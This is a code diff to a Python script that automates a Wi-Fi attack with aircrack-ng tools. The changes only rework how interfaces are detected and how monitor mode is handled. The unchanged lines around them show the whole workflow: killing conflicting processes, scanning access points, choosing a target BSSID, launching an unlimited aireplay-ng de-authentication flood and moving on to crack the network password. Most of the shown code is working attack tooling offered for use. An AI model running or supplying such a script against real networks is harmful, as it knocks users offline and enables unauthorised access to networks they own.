@@ -20,6 +20,20 @@ def check_for_essid(essid, lst):
     return True
 
 
+def list_wifi_interfaces():
+    """List all Wi-Fi interfaces including those in monitor mode."""
+    interfaces = []
+    try:
+        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
+        for line in iw_output.splitlines():
+            if "Interface" in line:
+                interface_name = line.split()[1]
+                interfaces.append(interface_name)
+    except Exception as e:
+        print(f"Error detecting Wi-Fi interfaces: {e}")
+    return interfaces
+
+
 if not 'SUDO_UID' in os.environ.keys():
     print("Run this program with sudo.")
     exit()
@@ -35,37 +49,38 @@ for file_name in os.listdir():
         timestamp = datetime.now()
         shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")
 
-# Detect Wi-Fi interfaces in managed mode
-wlan_pattern = re.compile("^wlan[0-9]+")
-check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+# Detect all Wi-Fi interfaces
+available_interfaces = list_wifi_interfaces()
 
-if len(check_wifi_result) == 0:
-    print("No managed mode Wi-Fi adapters found. Connect a Wi-Fi adapter and try again.")
+if len(available_interfaces) == 0:
+    print("No Wi-Fi adapters detected. Connect a Wi-Fi adapter and try again.")
     exit()
 
-print("Available WiFi interfaces (managed mode):")
-for index, item in enumerate(check_wifi_result):
+print("Available Wi-Fi interfaces:")
+for index, item in enumerate(available_interfaces):
     print(f"{index} - {item}")
 
 while True:
     wifi_interface_choice = input("Select the interface for the attack: ")
     try:
-        if check_wifi_result[int(wifi_interface_choice)]:
+        if available_interfaces[int(wifi_interface_choice)]:
             break
     except:
         print("Enter a valid number.")
 
-hacknic = check_wifi_result[int(wifi_interface_choice)]
+hacknic = available_interfaces[int(wifi_interface_choice)]
 
-# Switch to monitor mode
-print("WiFi adapter connected! Killing conflicting processes...")
-subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-print(f"Putting {hacknic} into monitor mode...")
-subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+# Switch to monitor mode if necessary
+if not hacknic.endswith("mon"):
+    print("Wi-Fi adapter connected! Killing conflicting processes...")
+    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+    print(f"Putting {hacknic} into monitor mode...")
+    subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+    hacknic += "mon"
 
 # Discover access points
 discover_access_points = subprocess.Popen(
-    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
+    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic],
     stdout=subprocess.DEVNULL,
     stderr=subprocess.DEVNULL,
 )
@@ -117,7 +132,7 @@ while True:
 
 print(f"Starting airodump-ng on channel {hackchannel} targeting BSSID {hackbssid}.")
 airodump_process = subprocess.Popen(
-    ["sudo", "airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", hacknic + "mon"],
+    ["sudo", "airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", hacknic],
     stdout=subprocess.DEVNULL,
     stderr=subprocess.DEVNULL,
 )
@@ -128,7 +143,7 @@ print("Launching de-authentication attack for 1 minute...")
 subprocess.Popen(
     [
         "x-terminal-emulator", "-e",
-        f"bash -c 'sudo aireplay-ng --deauth 0 -a {hackbssid} {hacknic}mon; exec bash'"
+        f"bash -c 'sudo aireplay-ng --deauth 0 -a {hackbssid} {hacknic}; exec bash'"
     ]
 )
 
@@ -137,7 +152,7 @@ airodump_process.terminate()
 
 if attack_choice == "1":
     print("De-authentication attack completed. Exiting program.")
-    subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"])
+    subprocess.run(["sudo", "airmon-ng", "stop", hacknic])
     exit()
 
 print("Proceeding to crack the Wi-Fi password...")
@@ -161,11 +176,11 @@ else:
 
 # Revert to managed mode
 print("Restoring Wi-Fi adapter to managed mode...")
-subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"])
+subprocess.run(["sudo", "airmon-ng", "stop", hacknic])
 
 # Verify the mode change
 iwconfig_result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
-if hacknic in iwconfig_result:
-    print(f"{hacknic} is now in managed mode.")
+if hacknic.replace("mon", "") in iwconfig_result:
+    print(f"{hacknic.replace('mon', '')} is now in managed mode.")
 else:
     print(f"Failed to restore {hacknic} to managed mode. Please check manually.")
